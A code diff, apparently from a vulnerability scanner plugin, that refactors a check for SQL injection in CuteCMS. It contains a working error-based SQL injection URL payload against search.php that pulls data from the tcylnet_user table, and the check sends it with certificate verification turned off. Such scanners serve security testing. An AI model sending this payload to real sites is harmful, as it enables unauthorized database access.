@@ -22,7 +22,7 @@ class VulnerabilityInfo(object):
 
 
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
     scheme, url, port =UrlProcessing().result(Url)
     if port is None and scheme == 'https':
@@ -35,15 +35,9 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
         payload = '/search.php?c=5&hit=1&s=%27and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20concat%28md5(c)%29%20from%20tcylnet_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27'
 
         payload_url = scheme + "//" + url + ":" + str(port) + payload
-        headers = {
-            'User-Agent': RandomAgent,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
 
-        resp = requests.get(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
+
+        resp = requests.get(payload_url,headers=Headers, timeout=6, proxies=proxies,verify=False)
         con = resp.text
         if con.find("4a8a08f09d37b73795649038408b5f33") != -1:
             Medusa = "{}存在CuteCMSSQL注入漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
